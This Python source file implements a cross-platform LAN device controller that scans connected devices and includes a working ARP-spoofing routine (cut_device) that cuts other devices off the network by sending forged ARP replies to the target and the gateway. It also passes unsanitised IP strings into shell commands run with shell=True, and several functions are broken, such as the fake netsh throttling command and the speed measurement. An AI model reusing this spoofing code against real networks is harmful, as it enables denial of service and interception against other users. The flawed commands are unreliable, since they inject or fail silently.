import platform
import psutil
import subprocess
import logging
import time
import socket
import warnings
import threading
import queue 
import os 
import sys
import requests
from dataclasses import dataclass
from typing import List, Dict, Optional, Tuple
from datetime import datetime

# Import platform-specific modules
if platform.system() == "Windows":
    from .npcap_helper import initialize_npcap, verify_npcap_installation
    from .windows import WindowsNetworkMonitor
    import ctypes
    import winreg
elif platform.system() == "Darwin":  # macOS
    try:
        from .macos import MacOSNetworkMonitor
    except ImportError:
        logging.warning("Could not import macOS-specific functionality")
elif platform.system() == "Linux":  # Linux/Ubuntu
    try:
        from .linux import LinuxNetworkMonitor
    except ImportError:
        logging.warning("Could not import Linux-specific functionality")

# Import Scapy modules after Npcap setup
from scapy.all import ARP, Ether, srp, send
try:
    from scapy.arch import get_if_hwaddr
    from scapy.layers.l2 import arping
    from scapy.sendrecv import srloop
except ImportError as e:
    logging.error(f"Failed to import Scapy modules: {e}")

@dataclass
class Device:
    ip: str
    mac: str
    hostname: Optional[str] = None
    vendor: Optional[str] = None
    device_type: Optional[str] = None
    signal_strength: Optional[int] = None
    connection_type: str = "WiFi"
    status: str = "active"
    speed_limit: Optional[float] = None
    current_speed: float = 0.0
    last_seen: datetime = None
    is_protected: bool = False
    is_blocked: bool = False
    attack_status: str = "none"  # none, scanning, cutting

    def __post_init__(self):
        if self.last_seen is None:
            self.last_seen = datetime.now()


class NetworkController:
    def __init__(self):
        self.os_type = platform.system()
        self.devices: Dict[str, Device] = {}
        self.mac_vendor_cache: Dict[str, str] = {}
        self.setup_logging()
        self._stop_event = threading.Event()
        self.monitoring_thread = None
        self.attack_threads: Dict[str, threading.Thread] = {}
        self.protected_devices: List[str] = []
        self._gateway_mac = None
        self._gateway_ip = None
        
        # Initialize platform-specific monitors
        self.platform_monitor = None
        
        if self.os_type == "Windows":
            # Setup Windows command paths
            system32 = os.path.join(os.environ['SystemRoot'], 'System32')
            self.ipconfig_path = os.path.join(system32, "ipconfig.exe")
            self.netsh_path = os.path.join(system32, "netsh.exe")
            self.arp_path = os.path.join(system32, "arp.exe")
            self.ping_path = os.path.join(system32, "ping.exe")
            
            try:
                self.platform_monitor = WindowsNetworkMonitor()
                logging.info("Windows network monitor initialized")
                
                if not initialize_npcap():
                    logging.warning("Npcap initialization failed, network monitoring may not work")
                else:
                    logging.info("Npcap initialized successfully")
            except Exception as e:
                logging.error(f"Failed to initialize Windows network monitor: {e}")
                self.platform_monitor = None
                
        elif self.os_type == "Darwin":  # macOS
            try:
                self.platform_monitor = MacOSNetworkMonitor()
                logging.info("macOS network monitor initialized")
            except Exception as e:
                logging.error(f"Failed to initialize macOS network monitor: {e}")
                self.platform_monitor = None
                
        elif self.os_type == "Linux":  # Linux/Ubuntu
            try:
                self.platform_monitor = LinuxNetworkMonitor()
                logging.info("Linux network monitor initialized")
            except Exception as e:
                logging.error(f"Failed to initialize Linux network monitor: {e}")
                self.platform_monitor = None
                
        # Initialize measurement variables
        self.last_measurement_time = time.time()
        self.last_bytes_total = 0

    def _get_windows_command_path(self, command):
        system32 = os.path.join(os.environ['SystemRoot'], 'System32')
        return os.path.join(system32, f"{command}.exe")

    def setup_logging(self):
        logging.basicConfig(
            level=logging.DEBUG,  # Changed from INFO to DEBUG
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler('networkmonitor.log'),
                logging.StreamHandler()
            ]
        )   
    
    def _get_gateway_info(self) -> Tuple[str, str]:
        if self._gateway_ip and self._gateway_mac:
            return self._gateway_ip, self._gateway_mac
            
        try:
            if self.os_type == "Windows":
                # Get default route information using 'route print'
                route_cmd = subprocess.run(['route', 'print', '0.0.0.0'], 
                                       capture_output=True, 
                                       text=True,
                                       creationflags=subprocess.CREATE_NO_WINDOW)
                
                for line in route_cmd.stdout.splitlines():
                    if '0.0.0.0' in line:
                        parts = line.split()
                        if len(parts) >= 4:
                            self._gateway_ip = parts[3]
                            break
            else:
                # For Linux/Mac, use psutil to get default gateway
                gateways = psutil.net_if_stats()
                for interface, stats in gateways.items():
                    if stats.isup and interface != 'lo':
                        addrs = psutil.net_if_addrs()[interface]
                        for addr in addrs:
                            if addr.family == socket.AF_INET:
                                self._gateway_ip = addr.address
                                break
                        if self._gateway_ip:
                            break

            # Get gateway MAC using ARP
            if self._gateway_ip:
                arp_output = subprocess.check_output([self.arp_path, "-a"], 
                                                text=True,
                                                creationflags=subprocess.CREATE_NO_WINDOW)
                
                for line in arp_output.splitlines():
                    if self._gateway_ip in line:
                        parts = line.split()
                        if len(parts) >= 2:
                            self._gateway_mac = parts[1].replace('-', ':').upper()
                            break
                            

        except Exception as e:
            logging.error(f"Error getting gateway info: {e}")
            return None, None
            
        return self._gateway_ip, self._gateway_mac

    def protect_device(self, ip: str) -> bool:
        """Enable protection for a device"""
        try:
            device = self.devices.get(ip)
            if device:
                device.is_protected = True
                self.protected_devices.append(ip)
                # Start ARP spoofing protection
                self._start_protection(ip, device.mac)
                return True
            return False
        except Exception as e:
            logging.error(f"Error protecting device: {e}")
            return False

    def unprotect_device(self, ip: str) -> bool:
        """Disable protection for a device"""
        try:
            device = self.devices.get(ip)
            if device:
                device.is_protected = False
                if ip in self.protected_devices:
                    self.protected_devices.remove(ip)
                return True
            return False
        except Exception as e:
            logging.error(f"Error unprotecting device: {e}")
            return False

    def _start_protection(self, ip: str, mac: str):
        """Start ARP spoofing protection for a device"""
        def protection_loop():
            try:
                gateway_ip, gateway_mac = self._get_gateway_info()
                if not gateway_ip or not gateway_mac:
                    return
                
                # Send gratuitous ARP responses to maintain correct ARP tables
                while ip in self.protected_devices:
                    # Send ARP to device with correct gateway info
                    self._send_arp(ip, mac, gateway_ip, gateway_mac)
                    # Send ARP to gateway with correct device info
                    self._send_arp(gateway_ip, gateway_mac, ip, mac)
                    time.sleep(1)
            except Exception as e:
                logging.error(f"Error in protection loop: {e}")

        thread = threading.Thread(target=protection_loop)
        thread.daemon = True
        thread.start()

    def cut_device(self, ip: str) -> bool:
        """Cut network access for a device using ARP spoofing"""
        try:
            device = self.devices.get(ip)
            if not device or device.is_protected:
                return False

            device.attack_status = "cutting"
            
            def attack_loop():
                try:
                    gateway_ip, gateway_mac = self._get_gateway_info()
                    if not gateway_ip or not gateway_mac:
                        return
                        
                    # Get our interface MAC
                    iface = self.get_default_interface()
                    our_mac = get_if_hwaddr(iface)
                    
                    while device.attack_status == "cutting":
                        # Send spoofed ARP to target
                        self._send_arp(ip, device.mac, gateway_ip, our_mac)
                        # Send spoofed ARP to gateway
                        self._send_arp(gateway_ip, gateway_mac, ip, our_mac)
                        time.sleep(1)
                        
                except Exception as e:
                    logging.error(f"Error in attack loop: {e}")
                finally:
                    device.attack_status = "none"
                    
            if ip in self.attack_threads:
                self.stop_cut(ip)
                
            thread = threading.Thread(target=attack_loop)
            thread.daemon = True
            thread.start()
            self.attack_threads[ip] = thread
            
            return True
        except Exception as e:
            logging.error(f"Error cutting device: {e}")
            return False

    def stop_cut(self, ip: str) -> bool:
        """Stop network cut for a device"""
        try:
            device = self.devices.get(ip)
            if device:
                device.attack_status = "none"
                if ip in self.attack_threads:
                    self.attack_threads[ip].join(timeout=2)
                    del self.attack_threads[ip]
                    
                # Restore correct ARP entries
                gateway_ip, gateway_mac = self._get_gateway_info()
                if gateway_ip and gateway_mac:
                    self._send_arp(ip, device.mac, gateway_ip, gateway_mac)
                    self._send_arp(gateway_ip, gateway_mac, ip, device.mac)
                    
                return True
            return False
        except Exception as e:
            logging.error(f"Error stopping cut: {e}")
            return False

    def _send_arp(self, target_ip: str, target_mac: str, spoof_ip: str, spoof_mac: str):
        """Send ARP packet with specified addresses"""
        try:
            arp = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=spoof_mac)
            send(arp, verbose=False)
        except Exception as e:
            logging.error(f"Error sending ARP: {e}")

    def get_interfaces(self) -> List[Dict]:
        """Get all network interfaces"""
        try:
            # Use platform-specific implementation if available
            if self.platform_monitor and hasattr(self.platform_monitor, 'get_interfaces'):
                return self.platform_monitor.get_interfaces()
                
            # Generic fallback implementation using psutil
            interfaces = []
            stats = psutil.net_if_stats()
            addrs = psutil.net_if_addrs()
            
            for interface, stat in stats.items():
                if stat.isup:
                    for addr in addrs.get(interface, []):
                        if addr.family == socket.AF_INET:
                            interfaces.append({
                                'name': interface,
                                'ip': addr.address,
                                'network_mask': addr.netmask,
                                'stats': stat
                            })
            return interfaces
        except Exception as e:
            logging.error(f"Error getting interfaces: {e}")
            return []

    def get_wifi_interfaces(self) -> List[str]:
        """Get list of WiFi interfaces"""
        try:
            # Use platform-specific implementation if available
            if self.platform_monitor and hasattr(self.platform_monitor, 'get_wifi_interfaces'):
                interfaces = self.platform_monitor.get_wifi_interfaces()
                if interfaces:
                    # Check if interfaces is a list of dictionaries or strings
                    if interfaces and isinstance(interfaces[0], dict):
                        return [iface.get('name', iface.get('device', '')) for iface in interfaces]
                    return interfaces
            
            # Generic fallback detection logic
            if self.os_type == "Windows":
                # Windows detection logic
                output = subprocess.check_output([self.ipconfig_path], 
                                              text=True, 
                                              creationflags=subprocess.CREATE_NO_WINDOW)
                
                wifi_interfaces = []
                current_interface = None
                
                for line in output.splitlines():
                    line = line.strip()
                    
                    if line.endswith(':'):
                        if "Wireless LAN adapter" in line:
                            current_interface = line[:-1].strip()
                            if current_interface.startswith('Wireless LAN adapter '):
                                current_interface = current_interface[len('Wireless LAN adapter '):]
                    elif current_interface and "Media disconnected" not in line:
                        if "IPv4 Address" in line:
                            wifi_interfaces.append(current_interface)
                            current_interface = None

                if wifi_interfaces:
                    return wifi_interfaces

                # Last resort: try to find any interface with "WiFi" or "Wireless" in the name
                all_interfaces = self.get_interfaces()
                wifi_candidates = [
                    iface['name'] for iface in all_interfaces 
                    if any(wifi_term in iface['name'].lower() 
                          for wifi_term in ['wifi', 'wireless', 'wlan'])
                ]
                if wifi_candidates:
                    return wifi_candidates
                return []

            elif self.os_type == "Darwin":  # macOS
                # Try to find interfaces with Airport/Wi-Fi in the name
                all_interfaces = self.get_interfaces()
                return [interface['name'] for interface in all_interfaces 
                       if any(term in interface['name'].lower() 
                             for term in ['wifi', 'airport', 'wi-fi', 'wireless'])]
                       
            elif self.os_type == "Linux":  # Linux
                # Look for wlan interfaces
                all_interfaces = self.get_interfaces()
                return [interface['name'] for interface in all_interfaces 
                       if interface['name'].startswith(('wlan', 'wifi', 'wi-fi', 'wl'))]
                   
        except Exception as e:
            logging.error(f"Error getting WiFi interfaces: {e}")
            return []
    
    def get_signal_strength(self, mac: str) -> Optional[int]:
        """Get WiFi signal strength for device"""
        try:
            # Use platform-specific implementation if available
            if self.platform_monitor and hasattr(self.platform_monitor, 'get_wifi_signal_strength'):
                signal_info = self.platform_monitor.get_wifi_signal_strength()
                # Look for the device MAC in any interface's info
                for interface_info in signal_info.values():
                    if isinstance(interface_info, dict) and interface_info.get('bssid', '').replace('-', ':').upper() == mac.upper():
                        return interface_info.get('signal_strength')
            return None
        except Exception as e:
            logging.error(f"Error getting signal strength: {e}")
            return None

    def guess_device_type(self, hostname: str, vendor: str) -> str:
        """Guess device type based on hostname and vendor"""
        if not hostname and not vendor:
            return "Unknown"

        hostname = (hostname or "").lower()
        vendor = (vendor or "").lower()

        patterns = {
            "smartphone": ["iphone", "android", "phone", "samsung", "huawei", "xiaomi"],
            "laptop": ["laptop", "macbook", "notebook", "dell", "lenovo", "hp", "asus"],
            "tablet": ["ipad", "tablet", "kindle"],
            "smart tv": ["tv", "roku", "firestick", "chromecast", "samsung tv", "lg tv"],
            "gaming": ["playstation", "xbox", "nintendo", "ps4", "ps5"],
            "iot": ["camera", "thermostat", "doorbell", "nest", "ring", "echo", "alexa"],
            "desktop": ["desktop", "pc", "imac", "workstation"]
        }

        for device_type, keywords in patterns.items():
            if any(keyword in hostname or keyword in vendor for keyword in keywords):
                return device_type.title()

        return "Unknown"

    def start_monitoring(self):
        """Start continuous device monitoring"""
        if not self.monitoring_thread or not self.monitoring_thread.is_alive():
            self._stop_event.clear()
            self.monitoring_thread = threading.Thread(target=self._monitor_loop)
            self.monitoring_thread.daemon = True
            self.monitoring_thread.start()

    def stop_monitoring(self):
        """Stop device monitoring"""
        self._stop_event.set()
        if self.monitoring_thread:
            self.monitoring_thread.join()

    def _monitor_loop(self):
        """Background monitoring loop"""
        while not self._stop_event.is_set():
            try:
                self.get_connected_devices()
                self._update_device_speeds()
                time.sleep(5)  # Scan every 5 seconds
            except Exception as e:
                logging.error(f"Error in monitoring loop: {e}")
                time.sleep(5)

    def _update_device_speeds(self):
        """Update current speeds for all devices"""
        try:
            stats = psutil.net_io_counters(pernic=True)
            for ip, device in self.devices.items():
                if device.status == "active":
                    total_bytes = sum(s.bytes_sent + s.bytes_recv for s in stats.values())
                    device.current_speed = total_bytes / 1_000_000  # Convert to Mbps
        except Exception as e:
            logging.error(f"Error updating device speeds: {e}")

    def get_device_details(self, ip: str) -> Optional[Dict]:
        """Get detailed information about a specific device"""
        device = self.devices.get(ip)
        if device:
            return {
                "ip": device.ip,
                "mac": device.mac,
                "hostname": device.hostname,
                "vendor": device.vendor,
                "device_type": device.device_type,
                "signal_strength": device.signal_strength,
                "connection_type": device.connection_type,
                "status": device.status,
                "current_speed": device.current_speed,
                "speed_limit": device.speed_limit,
                "last_seen": device.last_seen.isoformat()
            }
        return None

    def get_network_summary(self) -> Dict:
        """Get summary of network devices"""
        active_devices = [d for d in self.devices.values() if d.status == "active"]
        return {
            "total_devices": len(self.devices),
            "active_devices": len(active_devices),
            "device_types": {
                device_type: len([d for d in active_devices if d.device_type == device_type])
                for device_type in set(d.device_type for d in active_devices)
            },
            "total_bandwidth": sum(d.current_speed for d in active_devices)
        }
    def limit_device_speed(self, ip, speed_limit):
        """Limit device speed (in Mbps)"""
        try:
            # Use platform-specific implementation if available
            if self.platform_monitor and hasattr(self.platform_monitor, 'limit_device_speed'):
                return self.platform_monitor.limit_device_speed(ip, speed_limit * 1000)  # Convert to Kbps
                
            # Generic implementations based on OS type
            if self.os_type == "Windows":
                # Windows implementation (simplified, requires admin privileges)
                command = f"netsh interface set interface {ip} throttled {speed_limit}"
                subprocess.check_output(command, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
            elif self.os_type == "Darwin":  # macOS
                # macOS implementation using pfctl (simplified, requires admin/sudo)
                command = f"echo \"pass out route-to (lo0 127.0.0.1) inet from any to {ip} no state\npass in route-to (lo0 127.0.0.1) inet from {ip} to any no state\" | sudo pfctl -ef -"
                subprocess.check_output(command, shell=True)
            else:  # Linux
                # Linux implementation (simplified, requires sudo)
                command = f"tc qdisc add dev {self.get_default_interface()} handle ffff: ingress; tc filter add dev {self.get_default_interface()} parent ffff: protocol ip handle 1 u32 match ip dst {ip} flowid 1:1; tc qdisc add dev {self.get_default_interface()} parent 1:1 handle 10: tbf rate {speed_limit}mbit burst 100kb latency 50ms"
                subprocess.check_output(command, shell=True)
            return True
        except Exception as e:
            logging.error(f"Error limiting device speed: {e}")
            return False

    def block_device(self, ip):
        """Block (Disconnect) a device"""
        try:
            # Use platform-specific implementation if available
            if self.platform_monitor and hasattr(self.platform_monitor, 'block_device'):
                return self.platform_monitor.block_device(ip)
                
            # Generic implementations based on OS type
            if self.os_type == "Windows":
                # Windows implementation (requires admin privileges)
                command = f"netsh advfirewall firewall add rule name=Block_{ip} dir=in interface=any action=block remoteip={ip}"
                subprocess.check_output(command, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
            elif self.os_type == "Darwin":  # macOS
                # macOS implementation using pfctl (requires admin/sudo)
                command = f"echo \"block drop inet from any to {ip}\nblock drop inet from {ip} to any\" | sudo pfctl -ef -"
                subprocess.check_output(command, shell=True)
            else:  # Linux
                # Linux implementation using iptables (requires sudo)
                command = f"iptables -A INPUT -s {ip} -j DROP"
                subprocess.check_output(command, shell=True)
            return True
        except Exception as e:
            logging.error(f"Error blocking device: {e}")
            return False

    def unblock_device(self, ip):
        """Unblock a previously blocked device"""
        try:
            # Use platform-specific implementation if available
            if self.platform_monitor and hasattr(self.platform_monitor, 'unblock_device'):
                return self.platform_monitor.unblock_device(ip)
                
            # Generic implementations based on OS type
            if self.os_type == "Windows":
                # Windows implementation (requires admin privileges)
                command = f"netsh advfirewall firewall delete rule name=Block_{ip}"
                subprocess.check_output(command, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
            elif self.os_type == "Darwin":  # macOS
                # macOS implementation (requires admin/sudo)
                # This is simplified - would need to rewrite rules without the blocked IP
                command = f"sudo pfctl -d"  # Disable firewall
                subprocess.check_output(command, shell=True)
            else:  # Linux
                # Linux implementation (requires sudo)
                command = f"iptables -D INPUT -s {ip} -j DROP"
                subprocess.check_output(command, shell=True)
            return True
        except Exception as e:
            logging.error(f"Error unblocking device: {e}")
            return False